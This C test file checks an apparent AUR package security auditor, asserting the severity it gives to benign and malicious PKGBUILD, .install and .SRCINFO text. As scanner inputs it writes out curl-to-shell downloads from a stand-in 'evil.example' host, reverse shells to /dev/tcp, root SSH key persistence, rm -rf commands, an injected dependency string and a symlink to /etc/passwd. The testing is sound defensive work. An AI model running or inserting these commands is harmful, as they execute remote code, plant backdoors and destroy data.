#include "../test_helper.h"
#include "audit.h"
#include "fsutil.h"

#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

void run_audit_tests(void);
const char *make_fixture(int evil);

static Severity scan(const char *name, const char *text)
{
    Report r;
    report_init(&r);
    audit_scan_text(&r, name, text, strlen(text));
    Severity s = r.max;
    report_free(&r);
    return s;
}

static Severity srcinfo(const char *text)
{
    Report r;
    report_init(&r);
    audit_srcinfo_text(&r, text);
    Severity s = r.max;
    report_free(&r);
    return s;
}

static void write_file(const char *dir, const char *name, const char *content)
{
    char p[4096];
    snprintf(p, sizeof p, "%s/%s", dir, name);
    FILE *f = fopen(p, "w");
    if (!f) {
        perror(p);
        exit(1);
    }
    fputs(content, f);
    fclose(f);
}

static const char *good_srcinfo =
    "pkgbase = hello\n"
    "\tpkgver = 1.0\n\tpkgrel = 1\n"
    "\tsource = https://example.org/hello-1.0.tar.gz\n"
    "\tsha256sums = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\n"
    "pkgname = hello\n";

/* Builds a package dir in $TMPDIR; evil=1 adds malicious content. */
const char *make_fixture(int evil)
{
    static char dir[512];
    const char *t = getenv("TMPDIR");
    snprintf(dir, sizeof dir, "%s/inkaur-test-XXXXXX", t ? t : "/tmp");
    if (mkdtemp(dir) == NULL) {
        perror("mkdtemp");
        exit(1);
    }
    if (!evil) {
        write_file(dir, "PKGBUILD",
                   "pkgname=hello\npkgver=1.0\npkgrel=1\narch=(x86_64)\n"
                   "source=(https://example.org/hello-1.0.tar.gz)\n"
                   "build() { cd hello-1.0; make; }\n"
                   "package() { make -C hello-1.0 DESTDIR=\"$pkgdir\" install; }\n");
        write_file(dir, ".SRCINFO", good_srcinfo);
    } else {
        write_file(dir, "PKGBUILD",
                   "pkgname=hello\npkgver=1.0\npkgrel=1\ninstall=hello.install\n"
                   "source=(http://203.0.113.9/x.tar.gz)\n"
                   "build() { curl -s https://evil.example/p | sh; }\n");
        write_file(dir, ".SRCINFO",
                   "pkgbase = hello\n\tinstall = hello.install\n"
                   "\tsource = http://203.0.113.9/x.tar.gz\n\tsha256sums = SKIP\n"
                   "pkgname = hello\n");
        write_file(dir, "hello.install",
                   "post_install() {\n  echo key >> /root/.ssh/authorized_keys\n}\n");
        write_file(dir, "fix.patch", "--- a\n+++ b\n+eval \"$x\"\n");
        char link[600];
        snprintf(link, sizeof link, "%s/escape", dir);
        if (symlink("/etc/passwd", link) != 0)
            perror("symlink");
    }
    return dir;
}

void run_audit_tests(void)
{
    ASSERT(scan("PKGBUILD", "build() { make; }\n") == SEV_INFO, "benign build");
    ASSERT(scan("PKGBUILD", "curl -fsSL https://x/y.sh | bash\n") == SEV_CRIT, "curl|bash");
    ASSERT(scan("PKGBUILD", "wget -qO- http://x | sudo sh\n") == SEV_CRIT, "wget|sudo sh");
    ASSERT(scan("PKGBUILD", "echo aGk= | base64 -d | sh\n") == SEV_CRIT, "base64|sh");
    ASSERT(scan("PKGBUILD", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n") == SEV_CRIT, "reverse shell");
    ASSERT(scan("x.install", "cat k >> /root/.ssh/authorized_keys\n") == SEV_CRIT, "ssh key persistence");
    ASSERT(scan("PKGBUILD", "rm -rf $HOME\n") == SEV_CRIT, "rm -rf $HOME");
    ASSERT(scan("PKGBUILD", "  eval \"$cmd\"\n") == SEV_HIGH, "eval");
    ASSERT(scan("PKGBUILD", "chmod 4755 \"$pkgdir/usr/bin/x\"\n") == SEV_HIGH, "setuid chmod");
    ASSERT(scan("x.install", "systemctl enable --now evil.service\n") == SEV_HIGH, "systemctl enable");
    ASSERT(scan("PKGBUILD", "echo x >> ~/.bashrc\n") == SEV_HIGH, "bashrc persistence");
    ASSERT(scan("PKGBUILD", "source=(https://bit.ly/abc)\n") == SEV_HIGH, "url shortener");
    ASSERT(scan("PKGBUILD", "a=1\r# hidden\n") == SEV_HIGH, "carriage return trick");
    ASSERT(scan("PKGBUILD", "x=\"\xe2\x80\xae\"\n") == SEV_HIGH, "bidi override");
    ASSERT(scan("PKGBUILD", "printf '\033[2K'\n") == SEV_HIGH, "raw escape char");
    ASSERT(scan("x.patch", "+eval \"$x\"\n") == SEV_WARN, "patch severity capped");
    ASSERT(scan("x.patch", "-eval \"$x\"\n") == SEV_INFO, "removed patch lines ignored");
    ASSERT(scan("PKGBUILD", "# sudoku solver, evaluation\n") == SEV_INFO, "no false positive on words");

    ASSERT(srcinfo(good_srcinfo) == SEV_INFO, "good srcinfo");
    ASSERT(srcinfo("pkgbase = a\n\tsource = https://x/a.tgz\n\tsha256sums = SKIP\npkgname = a\n")
           == SEV_HIGH, "remote SKIP");
    ASSERT(srcinfo("pkgbase = a\n\tsource = https://x/a.tgz\npkgname = a\n") == SEV_HIGH,
           "no checksums");
    ASSERT(srcinfo("pkgbase = a\n\tsource = https://x/a.tgz\n\tsource = https://x/b.tgz\n"
                   "\tsha256sums = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824\n"
                   "pkgname = a\n") == SEV_HIGH, "checksum count mismatch");
    ASSERT(srcinfo("pkgbase = a\n\tsource = git+https://x/a.git\n\tsha256sums = SKIP\npkgname = a\n")
           == SEV_WARN, "unpinned VCS");
    ASSERT(srcinfo("pkgbase = a\n\tsource = git+https://x/a.git#commit=0123456789abcdef0123456789abcdef01234567\n"
                   "\tsha256sums = SKIP\npkgname = a\n") == SEV_INFO, "pinned VCS");
    ASSERT(srcinfo("pkgbase = a\n\tsource = git://x/a.git#commit=0123\n\tsha256sums = SKIP\npkgname = a\n")
           == SEV_HIGH, "git:// protocol");
    ASSERT(srcinfo("pkgbase = a\n\tvalidpgpkeys = DEADBEEF\npkgname = a\n") == SEV_HIGH,
           "short PGP key id");
    ASSERT(srcinfo("pkgbase = ../x\npkgname = a\n") == SEV_CRIT, "bad pkgbase");
    ASSERT(srcinfo("pkgbase = a\n\tdepends = x;rm -rf\npkgname = a\n") >= SEV_HIGH, "bad depstring");
    ASSERT(srcinfo("not a srcinfo") == SEV_CRIT, "malformed srcinfo");

    const char *good = make_fixture(0);
    Report r;
    report_init(&r);
    audit_repo(good, false, &r);
    ASSERT(r.max <= SEV_WARN, "clean repository");
    report_free(&r);
    char gd[512];
    snprintf(gd, sizeof gd, "%s", good);

    const char *evil = make_fixture(1);
    report_init(&r);
    audit_repo(evil, false, &r);
    ASSERT(r.max == SEV_CRIT, "malicious repository is CRITICAL");
    bool saw_symlink = false;
    for (size_t i = 0; i < r.n; i++)
        if (strstr(r.f[i].msg, "symlink"))
            saw_symlink = true;
    ASSERT(saw_symlink, "symlink detected");
    report_free(&r);

    ASSERT(rmtree(gd) == 0 && access(gd, F_OK) != 0, "rmtree removes fixture");
    ASSERT(rmtree(evil) == 0, "rmtree does not follow the symlink");
    ASSERT(access("/etc/passwd", F_OK) == 0, "symlink target untouched");
    ASSERT(rmtree("/") != 0 && rmtree("relative") != 0, "rmtree refuses / and relative");
    printf("audit: ok\n");
}

void run_audit_calibration_tests(void);

void run_audit_calibration_tests(void)
{
    ASSERT(scan("x.install", "post_install() {\n cat <<INFO\n  run: sudo aide --init\nINFO\n}\n")
           == SEV_INFO, "displayed heredoc is not code");
    ASSERT(scan("x.install", "cat > /tmp/x.sh <<EOF\nsudo rm -rf /\nEOF\n") >= SEV_HIGH,
           "heredoc written to a file is code");
    ASSERT(scan("x.install", "cat <<EOF | sh\ncurl -s x | sh\nEOF\n") == SEV_CRIT,
           "heredoc piped to sh is code");
    ASSERT(scan("x.install", "echo 'then run: sudo aide --init'\n") == SEV_WARN,
           "echo message capped at WARN");
    ASSERT(scan("x.install", "echo hi; sudo rm x\n") == SEV_HIGH, "echo chained with code");
    ASSERT(scan("aide.conf", "/etc/shadow NORMAL\n/etc/cron.d R\n") == SEV_INFO,
           "data file path mention is INFO");
    ASSERT(scan("evil.service", "ExecStart=/bin/sh -c 'curl x | sh'\n") == SEV_CRIT,
           "exec pattern in unit file stays CRITICAL");
    ASSERT(scan("notes.txt", "bash -i >& /dev/tcp/1.2.3.4/1 0>&1\n") == SEV_CRIT,
           "reverse shell in any file stays CRITICAL");
    printf("audit calibration: ok\n");
}
